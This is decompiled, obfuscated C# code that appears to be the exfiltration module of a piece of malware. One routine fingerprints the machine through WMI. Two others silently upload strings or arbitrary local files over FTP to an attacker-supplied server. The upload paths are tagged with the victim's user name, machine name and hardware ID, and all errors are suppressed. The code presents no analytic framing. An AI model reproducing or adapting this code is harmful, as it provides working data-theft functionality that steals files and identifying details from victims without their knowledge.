using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace PMpBbYpvEb;

internal sealed class tHlEcNRvGaVVN
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string IYTCsYJsmzxE()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107411768));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107411715)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107411698);
			ManagementObject val3 = new ManagementObject(getString_0(107411693) + text2 + getString_0(107411652));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107411679)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107389544) : text;
		}
	}

	public static void CjpZJXQFOpmLruF(string tiMQzsSwXBGw = "URL", string PygdscAeibz = "USERNAME", string edHZziqhvFmU = "ACCESO", string CURoahjxtdn = "")
	{
		try
		{
			string text = IYTCsYJsmzxE();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(tiMQzsSwXBGw + getString_0(107413220) + Environment.UserName + getString_0(107413239) + Environment.MachineName + getString_0(107413218) + text + getString_0(107413213));
			ftpWebRequest.Method = getString_0(107411622);
			ftpWebRequest.Credentials = new NetworkCredential(PygdscAeibz, edHZziqhvFmU);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(CURoahjxtdn);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void LwYCJufplFzw(string zxxzLHmCYqE = "URL", string CZSlASmZvqngvWQ = "USERNAME", string MekeOVYjGrbSWM = "ACCESO", string AkwMwZyCgyvqbvcz = "")
	{
		try
		{
			string text = IYTCsYJsmzxE();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(zxxzLHmCYqE + getString_0(107413220) + Environment.UserName + getString_0(107413239) + Environment.MachineName + getString_0(107413218) + text + getString_0(107413218) + Path.GetFileName(AkwMwZyCgyvqbvcz));
			ftpWebRequest.Method = getString_0(107411622);
			ftpWebRequest.Credentials = new NetworkCredential(CZSlASmZvqngvWQ, MekeOVYjGrbSWM);
			byte[] array = File.ReadAllBytes(AkwMwZyCgyvqbvcz);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static tHlEcNRvGaVVN()
	{
		Strings.CreateGetStringDelegate(typeof(tHlEcNRvGaVVN));
	}
}
